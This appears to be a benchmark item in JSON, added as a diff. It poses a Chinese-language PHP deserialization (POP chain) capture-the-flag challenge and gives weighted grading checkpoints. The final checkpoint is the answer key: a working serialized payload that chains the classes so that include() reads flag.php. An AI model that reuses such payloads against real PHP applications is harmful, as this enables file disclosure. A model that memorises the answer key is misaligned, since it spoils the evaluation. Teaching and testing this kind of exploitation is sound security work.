@@ -1,0 +1,39 @@
+{
+    "topic": "请作答如下ctf题目:\n\n## 题目描述:\n\n```php\n<?php\n//flag is in flag.php\nhighlight_file(__FILE__);\nerror_reporting(0);\nclass Modifier {\n    private $var;\n    public function append($value)\n    {\n        include($value);\n        echo $flag;\n    }\n    public function __invoke(){\n        $this->append($this->var);\n    }\n}\n\nclass Show{\n    public $source;\n    public $str;\n    public function __toString(){\n        return $this->str->source;\n    }\n    public function __wakeup(){\n        echo $this->source;\n    }\n}\n\nclass Test{\n    public $p;\n    public function __construct(){\n        $this->p = array();\n    }\n\n    public function __get($key){\n        $function = $this->p;\n        return $function();\n    }\n}\n\nif(isset($_GET['pop'])){\n    unserialize($_GET['pop']);\n}\n?>\n```\n",
+    "checkpoint": [
+      {
+        "反序列化": 0.1
+      },
+      {
+        "Show(.*)wakeup()": 0.1
+      },
+      {
+        "tostring": 0.1
+      },
+      {
+        "__get()": 0.1
+      },
+      {
+        "__invoke": 0.1
+      },
+      {
+        "var(.*)flag.php": 0.1
+      },
+      {
+        "var(.*)私有|var(.*)private": 0.2
+      },
+      {
+        "O:4:\"Show\":2:{s:6:\"source\";r:1;s:3:\"str\";O:4:\"Test\":1:{s:1:\"p\";O:8:\"Modifier\":1:{s:13:\"%00Modifier%00var\";s:8:\"flag.php\";}}}": 0.2
+      }
+    ],
+    "matchingmethod": [
+      "normal",
+      "regex",
+      "normal",
+      "normal",
+      "normal",
+      "regex",
+      "regex",
+      "normal"
+    ]
+  }
